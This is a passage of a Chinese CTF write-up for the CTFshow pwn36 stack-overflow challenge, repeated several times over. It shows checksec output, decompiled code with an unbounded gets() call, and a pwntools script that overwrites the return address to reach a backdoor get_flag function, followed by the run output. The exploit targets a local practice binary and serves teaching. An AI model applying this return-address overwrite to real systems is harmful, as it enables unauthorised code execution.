<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>



<h2 id="pwn36-26"><a href="#pwn36-26" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn36-27"><a href="#pwn36-27" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>



<h2 id="pwn36-28"><a href="#pwn36-28" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting local process &#x27;./pwn&#x27;: pid 872</span><br><span class="line">[*] &#x27;/CTFshow_pwn/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor functions here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn36-29"><a href="#pwn36-29" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>







































































































































